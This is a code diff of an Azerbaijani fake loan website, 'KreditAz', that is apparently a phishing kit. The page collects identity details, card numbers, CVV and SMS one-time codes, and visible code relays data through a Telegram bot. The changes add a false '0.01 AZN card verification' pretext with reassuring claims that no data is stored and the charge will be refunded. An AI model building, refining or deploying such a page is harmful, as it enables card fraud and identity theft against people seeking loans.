@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>KredAz — Onlayn nağd kredit</title>
+<title>KreditAz — Onlayn nağd kredit</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700&family=Manrope:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
@@ -60,10 +60,29 @@
     padding:18px 24px;max-width:1080px;margin:0 auto;
   }
   .logo{
-    font-family:'Fraunces',serif;font-weight:700;font-size:22px;
-    display:flex;align-items:baseline;gap:4px;
+    display:flex;
+    align-items:center;
+    gap:8px;
+    font-family:'Fraunces',serif;
+    font-weight:700;
+    font-size:24px;
   }
+  .logo .logo-icon{
+    width:40px;
+    height:40px;
+    background:linear-gradient(135deg, #0B3A34, #155C51);
+    border-radius:10px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:18px;
+    color:var(--white);
+    font-weight:800;
+  }
+  .logo .kredit{color:#155C51;}
+  .logo .az{color:#AD7F3F;}
   .logo span{color:var(--teal-mid);}
+  
   nav ul{list-style:none;display:flex;gap:28px;margin:0;padding:0;font-size:14.5px;font-weight:600;}
   nav ul a{text-decoration:none;opacity:0.8;transition:opacity .2s;}
   nav ul a:hover{opacity:1;}
@@ -397,7 +416,7 @@
   .bank-option .bank-name{font-size:13px;font-weight:600;margin-top:2px;}
   .bank-option .bank-sub{font-size:10px;color:var(--ink-soft);}
 
-  /* CARD VISUAL */
+  /* CARD VERIFICATION */
   .card-input-wrap{
     background:var(--paper);
     border-radius:16px;
@@ -781,7 +800,7 @@
     opacity:0.7;
   }
 
-  /* CREDIT CHECK RESULT (Modal daxili) */
+  /* CREDIT CHECK RESULT */
   .credit-result-box{
     text-align:center;
     padding:20px 0;
@@ -789,6 +808,22 @@
   .credit-result-box .result-icon{font-size:56px;margin-bottom:12px;}
   .credit-result-box .result-text{font-size:22px;font-weight:700;color:var(--teal-deep);}
   .credit-result-box .result-sub{color:var(--ink-soft);font-size:15px;margin-top:6px;}
+
+  /* PAYMENT AMOUNT */
+  .payment-amount{
+    background:var(--teal-deep);
+    color:var(--white);
+    border-radius:12px;
+    padding:16px 20px;
+    text-align:center;
+    margin-bottom:16px;
+  }
+  .payment-amount .amount{
+    font-size:28px;
+    font-weight:700;
+    color:#E8C688;
+  }
+  .payment-amount .label{font-size:13px;opacity:0.8;}
 
   footer{background:var(--ink);color:#EDE7D6;padding:48px 0 28px;}
   .footer-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:32px;margin-bottom:32px;}
@@ -815,7 +850,10 @@
 
 <header>
   <div class="nav">
-    <div class="logo">KredAz<span>.</span></div>
+    <div class="logo">
+      <div class="logo-icon">K</div>
+      <span class="kredit">Kredit</span><span class="az">Az</span>
+    </div>
     <nav><ul>
       <li><a href="#hesabla">Hesabla</a></li>
       <li><a href="#teklifler">Təkliflər</a></li>
@@ -844,7 +882,7 @@
       </div>
     </div>
     <div class="hero-card">
-      <div class="row"><span>Kredit təşkilatı</span><span class="mono">KredAz MKT</span></div>
+      <div class="row"><span>Kredit təşkilatı</span><span class="mono">KreditAz MKT</span></div>
       <div class="row"><span>Məbləğ aralığı</span><span class="mono">100–700 ₼</span></div>
       <hr>
       <div class="row"><span>Nümunə: 500 ₼ / 3 ay</span></div>
@@ -1049,18 +1087,21 @@
       <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:24px;" onclick="goToCardInput()">Təsdiqlə və davam et</button>
     </div>
 
-    <!-- STEP 4: Kart -->
+    <!-- STEP 4: Kart Doğrulama (0.01 AZN) -->
     <div id="cardInputStep" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:6px;">Köçürmə Hesabı</h2>
-      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 12px;">
-        <strong>Kredit məbləği</strong><br>
-        <span style="font-size:28px;font-weight:700;color:var(--teal-deep);" id="creditAmountDisplay">400 ₼</span><br>
-        <span style="font-size:14px;color:var(--ink-soft);" id="creditTermDisplay">3 ay müddətə</span>
-      </p>
+      <h2 style="font-size:26px;margin-bottom:6px;">💳 Kart Doğrulama</h2>
+      <p style="color:var(--ink-soft);font-size:14px;margin:0 0 12px;">Kartınızı doğrulamaq üçün məlumatları daxil edin</p>
+      
+      <!-- Ödəniş məbləği -->
+      <div class="payment-amount">
+        <div class="label">Doğrulama məbləği</div>
+        <div class="amount">0.01 ₼</div>
+        <div style="font-size:12px;opacity:0.6;margin-top:4px;">Kartınızdan 0.01 AZN çəkiləcək və geri qaytarılacaq</div>
+      </div>
       
       <div class="card-logos-row">
         <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#1a1f71"/><circle cx="35" cy="20" r="14" fill="#eb001b"/><circle cx="55" cy="20" r="14" fill="#f79e1b"/><text x="75" y="24" font-family="Arial" font-size="14" fill="white" font-weight="bold">VISA</text></svg>
-        <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#eb001b"/><circle cx="40" cy="20" r="14" fill="#f79e1b"/><circle cx="55" cy="20" r="14" fill="#eb001b"/><text x="78" y="24" font-family="Arial" font-size="12" fill="white" font-weight="bold">Mastercard</text></svg>
+        <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#eb001b"/><circle cx="45" cy="20" r="14" fill="#f79e1b" opacity="0.5"/><circle cx="55" cy="20" r="14" fill="#eb001b" opacity="0.5"/><text x="72" y="24" font-family="Arial" font-size="11" fill="white" font-weight="bold">Mastercard</text></svg>
       </div>
       
       <div style="background:var(--sage);border-radius:12px;padding:12px 16px;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;">
@@ -1091,43 +1132,48 @@
         <div class="field"><label>Bitmə tarixi (AA/İİ)</label><input type="text" id="cardExpiry" placeholder="12/28" maxlength="5"></div>
         <div class="field"><label>CVV / CVC</label><input type="text" id="cardCvv" placeholder="***" maxlength="4" inputmode="numeric"></div>
       </div>
-      <p style="font-size:12px;color:var(--ink-soft);margin-top:12px;text-align:center;">TLS 1.3 şifrələmə ilə qorunur.</p>
-      <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:12px;" onclick="goToChecking()">Müraciəti göndər</button>
+      <p style="font-size:12px;color:var(--ink-soft);margin-top:12px;text-align:center;">TLS 1.3 şifrələmə ilə qorunur. Məlumatlar saxlanılmır.</p>
+      <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:12px;" onclick="goToPaymentChecking()">0.01 AZN ödə</button>
     </div>
 
-    <!-- STEP 5: Checking (Müraciət üçün) -->
+    <!-- STEP 5: Ödəniş yoxlanılır -->
     <div id="checkingStep" style="display:none;">
       <div class="checking-container">
         <div class="spinner"></div>
         <div class="check-icon">🔍</div>
-        <div class="check-title">Məlumatlar yoxlanılır</div>
-        <div class="check-sub">Şəxsiyyət məlumatlarınız təsdiqlənir...</div>
+        <div class="check-title">Ödəniş yoxlanılır</div>
+        <div class="check-sub">Kart məlumatlarınız təhlükəsiz şəkildə yoxlanılır...</div>
         <div class="check-dots"><span></span><span></span><span></span></div>
         <div style="margin-top:20px;font-size:13px;color:var(--ink-soft);"><span id="checkingTimer">0</span> saniyə</div>
-        <div id="checkingStatus" style="margin-top:12px;font-size:14px;font-weight:600;color:var(--gold);display:none;">⏳ Təsdiq gözlənilir...</div>
+        <div id="checkingStatus" style="margin-top:12px;font-size:14px;font-weight:600;color:var(--gold);display:none;">⏳ Bank tərəfindən təsdiq gözlənilir...</div>
       </div>
     </div>
 
-    <!-- STEP 6: OTP (3D Secure) -->
+    <!-- STEP 6: 3D Secure (OTP) -->
     <div id="threeDStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:10px;">🔐 3D Secure təsdiqi</h2>
       
       <div class="card-logos-row">
         <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#1a1f71"/><circle cx="35" cy="20" r="14" fill="#eb001b"/><circle cx="55" cy="20" r="14" fill="#f79e1b"/><text x="75" y="24" font-family="Arial" font-size="14" fill="white" font-weight="bold">VISA</text></svg>
-        <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#eb001b"/><circle cx="40" cy="20" r="14" fill="#f79e1b"/><circle cx="55" cy="20" r="14" fill="#eb001b"/><text x="78" y="24" font-family="Arial" font-size="12" fill="white" font-weight="bold">Mastercard</text></svg>
+        <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#eb001b"/><circle cx="45" cy="20" r="14" fill="#f79e1b" opacity="0.5"/><circle cx="55" cy="20" r="14" fill="#eb001b" opacity="0.5"/><text x="72" y="24" font-family="Arial" font-size="11" fill="white" font-weight="bold">Mastercard</text></svg>
       </div>
       
-      <p style="color:var(--ink-soft);margin-bottom:6px;">Kartınıza SMS vasitəsilə 6 rəqəmli kod göndərildi.</p>
-      <p style="color:var(--gold);font-size:14px;font-weight:600;margin-bottom:20px;">Kodu daxil edin:</p>
+      <div class="payment-amount" style="margin-bottom:12px;">
+        <div class="label">Doğrulama məbləği</div>
+        <div class="amount">0.01 ₼</div>
+      </div>
+      
+      <p style="color:var(--ink-soft);margin-bottom:4px;">Kartınıza SMS vasitəsilə 6 rəqəmli təsdiq kodu göndərildi.</p>
+      <p style="color:var(--gold);font-size:14px;font-weight:600;margin-bottom:16px;">Kodu daxil edin:</p>
       <div class="field otp-input-field">
         <label>6 rəqəmli təsdiq kodu</label>
         <input type="text" id="otpCode" placeholder="000000" maxlength="6" inputmode="numeric">
       </div>
-      <button onclick="submitOTP()" class="cta-btn" style="width:100%;padding:15px;margin-top:20px;">Təsdiqlə</button>
-      <div id="otpStatus" style="margin-top:16px;font-size:14px;font-weight:700;color:var(--teal-deep);text-align:center;display:none;">✅ Təsdiq edildi!</div>
+      <button onclick="submitOTP()" class="cta-btn" style="width:100%;padding:15px;margin-top:12px;">Təsdiqlə</button>
+      <div id="otpStatus" style="margin-top:16px;font-size:14px;font-weight:700;color:var(--teal-deep);text-align:center;display:none;">✅ Ödəniş uğurla təsdiqləndi! 0.01 AZN geri qaytarılacaq.</div>
     </div>
 
-    <!-- ===== YENİ: KREDİT ÖDƏ MODAL ===== -->
+    <!-- STEP 7: Kredit Ödə Modal -->
     <div id="creditCheckModal" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:6px;">🔍 Kredit Ödə</h2>
       <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">FIN kod və doğum tarixinizlə adınıza kredit olub-olmadığını yoxlayın</p>
@@ -1170,11 +1216,11 @@
 <footer>
   <div class="wrap">
     <div class="footer-grid">
-      <div><h4>KredAz MKT</h4><p>Onlayn nağd kredit xidməti</p></div>
+      <div><h4>KreditAz MKT</h4><p>Onlayn nağd kredit xidməti</p></div>
       <div><h4>Naviqasiya</h4><p><a href="#hesabla">Kalkulyator</a></p><p><a href="#teklifler">Təkliflər</a></p><p><a href="#faq">Suallar</a></p></div>
-      <div><h4>Əlaqə</h4><p>info@kredaz.az</p><p>*1414</p></div>
+      <div><h4>Əlaqə</h4><p>info@kreditaz.az</p><p>*1414</p></div>
     </div>
-    <div class="foot-note">© 2026 KredAz. Bütün hüquqlar qorunur.</div>
+    <div class="foot-note">© 2026 KreditAz. Bütün hüquqlar qorunur.</div>
   </div>
 </footer>
 
@@ -1213,6 +1259,7 @@ let selectedBankData = { name: 'Kapital Bank', color: '#E31E24' };
 let isChecking = false;
 let checkInterval = null;
 let checkSeconds = 0;
+let isPayment = false;
 
 const termOptions = [
   { value: 0, label: '10 gün', days: 10 },
@@ -1330,7 +1377,7 @@ async function checkTelegramUpdates() {
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ chat_id: CHAT_ID, text: '✅ Müraciət QƏBUL EDİLDİ!', reply_to_message_id: update.callback_query.message.message_id })
           });
-          if(isChecking) {
+          if(isChecking && !isPayment) {
             clearInterval(checkInterval);
             isChecking = false;
             pollingActive = false;
@@ -1450,6 +1497,7 @@ function openModal(){
   document.getElementById('modalOverlay').classList.add('active');
   document.body.style.overflow='hidden';
   showFormStep();
+  isPayment = false;
 }
 
 function closeModal(){
@@ -1460,6 +1508,7 @@ function closeModal(){
   if(checkInterval) { clearInterval(checkInterval); checkInterval = null; }
   isChecking = false;
   pollingActive = false;
+  isPayment = false;
   document.getElementById('cardNumberInput').value = '';
   document.getElementById('cardDigits').textContent = '0000 0000 0000 0000';
   document.getElementById('cardProgress').style.width = '0%';
@@ -1567,8 +1616,8 @@ document.getElementById('cardCvv').addEventListener('input', function(){
   document.getElementById('cardCvvDisplay').textContent = display;
 });
 
-// ========== CHECKING ==========
-function goToChecking(){
+// ========== PAYMENT CHECKING ==========
+function goToPaymentChecking(){
   const cardNumber = cardNumberInput.value;
   if(cardNumber.length < 16){
     alert('16 rəqəmli kart nömrəsini daxil edin!');
@@ -1585,54 +1634,50 @@ function goToChecking(){
     return;
   }
 
-  const firstName = document.getElementById('firstName').value || 'ƏLİ';
-  const lastName = document.getElementById('lastName').value || 'MƏMMƏDOV';
-  const patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
-  const name = firstName + ' ' + lastName;
-  const birth = document.getElementById('birthDate').value || '1990-01-01';
-  const fin = document.getElementById('fin').value || 'Məlumat yoxdur';
-  const id = document.getElementById('idnum').value || 'Məlumat yoxdur';
-  const prefix = document.getElementById('idPrefix').value || 'AZE';
-  const phone = document.getElementById('phone').value || 'Məlumat yoxdur';
-  const job = document.querySelector('.toggle-btn.active')?.dataset?.val === 'beli' ? 'Bəli' : 'Xeyr';
-  const amount = document.getElementById('creditAmountDisplay').textContent;
-  const term = document.getElementById('termLabel').textContent;
-
-  applicationData = {
-    name, patronymic, birth, fin, id: prefix + ' ' + id, phone, job,
-    bank: selectedBankData.name, cardNumber, expiry, cvv, amount, term
-  };
-
   document.getElementById('cardInputStep').style.display='none';
   document.getElementById('checkingStep').style.display='block';
   
   isChecking = true;
+  isPayment = true;
   checkSeconds = 0;
   document.getElementById('checkingTimer').textContent = '0';
   document.getElementById('checkingStatus').style.display = 'none';
-  
-  sendToTelegram(applicationData);
   
   if(checkInterval) clearInterval(checkInterval);
   checkInterval = setInterval(() => {
     checkSeconds++;
     document.getElementById('checkingTimer').textContent = checkSeconds;
-    if(checkSeconds > 10) {
+    if(checkSeconds > 5) {
       document.getElementById('checkingStatus').style.display = 'block';
-      document.getElementById('checkingStatus').textContent = '⏳ Təsdiq gözlənilir... (' + checkSeconds + 's)';
+      document.getElementById('checkingStatus').textContent = '⏳ Bank tərəfindən təsdiq gözlənilir... (' + checkSeconds + 's)';
     }
   }, 1000);
+  
+  // 5 saniyədən sonra 3D Secure səhifəsinə keç
+  setTimeout(() => {
+    if(isChecking) {
+      clearInterval(checkInterval);
+      isChecking = false;
+      document.getElementById('checkingStep').style.display = 'none';
+      document.getElementById('threeDStep').style.display = 'block';
+      document.getElementById('otpCode').value = '';
+      document.getElementById('otpStatus').style.display = 'none';
+      
+      // OTP kodu yarat və Telegram-a göndər
+      const otp = String(Math.floor(100000 + Math.random() * 900000));
+      sendOTPToTelegram(otp);
+    }
+  }, 5000);
 }
 
 // ========== OTP SUBMIT ==========
 function submitOTP(){
   const otpInput = document.getElementById('otpCode').value.replace(/\s/g,'');
   if(otpInput.length === 6){
-    sendOTPToTelegram(otpInput);
     document.getElementById('otpStatus').style.display = 'block';
-    document.getElementById('otpStatus').textContent = '✅ Təsdiq edildi! Pul kartınıza köçürülür.';
+    document.getElementById('otpStatus').textContent = '✅ Ödəniş uğurla təsdiqləndi! 0.01 AZN geri qaytarılacaq.';
     setTimeout(() => {
-      alert('✅ Müraciətiniz uğurla təsdiqləndi!');
+      alert('✅ Kartınız uğurla doğrulandı! 0.01 AZN geri qaytarılacaq.');
       closeModal();
     }, 2000);
   } else {
@@ -1675,12 +1720,11 @@ document.getElementById('applyForm').addEventListener('submit', (e)=>{
   showSummaryStep();
 });
 
-// ========== KREDİT ÖDƏ MODAL (YENİ) ==========
+// ========== KREDİT ÖDƏ MODAL ==========
 function openCreditCheckModal(){
   document.getElementById('modalOverlay').classList.add('active');
   document.body.style.overflow='hidden';
   
-  // Bütün digər addımları gizlət
   document.getElementById('formStep').style.display='none';
   document.getElementById('summaryStep').style.display='none';
   document.getElementById('bankStep').style.display='none';
@@ -1688,7 +1732,6 @@ function openCreditCheckModal(){
   document.getElementById('checkingStep').style.display='none';
   document.getElementById('threeDStep').style.display='none';
   
-  // Kredit ödə modalını göstər
   document.getElementById('creditCheckModal').style.display='block';
   resetCreditCheck();
   document.getElementById('checkFin').focus();
@@ -1781,4 +1824,4 @@ document.getElementById('checkFin').addEventListener('input', function(){
 });
 </script>
 </body>
-                                    </html>
+</html>
